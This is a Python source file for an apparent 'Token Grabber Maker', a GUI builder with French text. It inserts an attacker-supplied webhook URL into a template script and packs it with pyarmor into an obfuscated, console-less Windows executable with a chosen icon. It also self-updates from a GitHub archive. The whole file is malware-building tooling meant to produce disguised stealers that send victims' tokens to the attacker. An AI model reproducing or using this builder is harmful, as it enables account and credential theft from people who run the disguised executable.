# coding: utf-8
import requests
import PySimpleGUI as sg
import os
import shutil
import time
import ctypes
import sys

def build():
    version = requests.get("https://raw.githubusercontent.com/Teobre/TokenGrabberMaker/main/Files/version")
    ctypes.windll.kernel32.SetConsoleTitleW(f"Token Grabber Maker | Version {version.text} | Créé par Teobre#0787")
    if version.text != "1.0\n":
        print("Une nouvelle version est disponible, le téléchargement est en cours.")
        ctypes.windll.kernel32.SetConsoleTitleW(f"Token Grabber Maker | Mise à jour en cours... | Créé par Teobre#0787")
        new_version = requests.get("https://github.com/Teobre/TokenGrabberMaker/archive/main.zip")
        with open("TokenGrabberMaker.zip", 'wb') as file:
            file.write(new_version.content)
        ctypes.windll.kernel32.SetConsoleTitleW("Token Grabber Maker | Mise à jour terminée | Créé par Teobre#0787")
        shutil.unpack_archive("TokenGrabberMaker.zip")
        os.remove("TokenGrabberMaker.zip")
        shutil.rmtree("Files")
        print("Mise à jour effectuée avec succès !")
        input("Appuyez sur une touche pour continuer...")
        sys.exit()
    print("""
      _______    _                 _____           _     _                 __  __       _             
     |__   __|  | |               / ____|         | |   | |               |  \/  |     | |            
        | | ___ | | _____ _ __   | |  __ _ __ __ _| |__ | |__   ___ _ __  | \  / | __ _| | _____ _ __ 
        | |/ _ \| |/ / _ \ '_ \  | | |_ | '__/ _` | '_ \| '_ \ / _ \ '__| | |\/| |/ _` | |/ / _ \ '__|
        | | (_) |   <  __/ | | | | |__| | | | (_| | |_) | |_) |  __/ |    | |  | | (_| |   <  __/ |   
        |_|\___/|_|\_\___|_| |_|  \_____|_|  \__,_|_.__/|_.__/ \___|_|    |_|  |_|\__,_|_|\_\___|_|   by Teobre#0787
                                                                                                                                                                                     
    """)
    layout = [
        [sg.Text('Webhook', size=(15, 1)), sg.Input(size=(40, 1), key="webhook")],
        [sg.Text('Name File', size=(15, 1)), sg.Input(size=(40, 1), key="name")],
        [sg.Text('Icon', size=(15, 1)), sg.InputText(size=(40, 1), key="iconpath"), sg.FileBrowse(file_types=(("Icon Files", "*.ico"),("All Files", "*.*")), size=(6,1), key="iconbrowse")],
        [sg.Button("Make EXE", size=(10, 1))]
    ]
    window = sg.Window("Token Grabber Maker", layout=layout, size=(510, 140))
    while True:
        event, value = window.read()
        if event in ("Exit", "Quit", None):
            break
        elif event == "Make EXE":
            if not os.path.exists("Executable\\"):
                os.mkdir("Executable\\")
            if value["webhook"] == '':
                sg.PopupNonBlocking("Spécifiez un webhook !")
                continue
            elif value["name"] == '':
                sg.PopupNonBlocking("Spécifiez un nom !")
                continue
            elif value['iconpath'] == '':
                sg.PopupNonBlocking("L'icône est obligatoire.")
                continue
            check = requests.get(value['webhook'])
            if not check.status_code == 200:
                sg.PopupNonBlocking("Le webhook spécifié est invalide.")
                continue
            print("Le .exe est en train d'être créé. Patientez...")
            with open("Files\\template.py", "r") as f:
                lines = f.readlines()
            with open(f"Executable\\{value['name']}.py", "w") as f2:
                lines.insert(10, f"url = \"{str(value['webhook'])}\"")
                f2.write("".join(lines))
            os.chdir('Executable\\')
            icon = value['iconpath']
            name = value['name']
            os.system(f"""pyarmor pack -e \" --noconsole -F '--icon={icon}'\" \"{os.getcwd()}\\{name}.py\"""")
            shutil.move(f"{os.getcwd()}\\dist\\{name}.exe", f"{os.getcwd()}\\{name}.exe")
            shutil.rmtree('build')
            shutil.rmtree('dist')
            os.remove(f"{name}.py")
            os.system('cls')
            sg.PopupNonBlocking("Le .exe a bien été créé !")
            

if __name__ == "__main__":
    build()
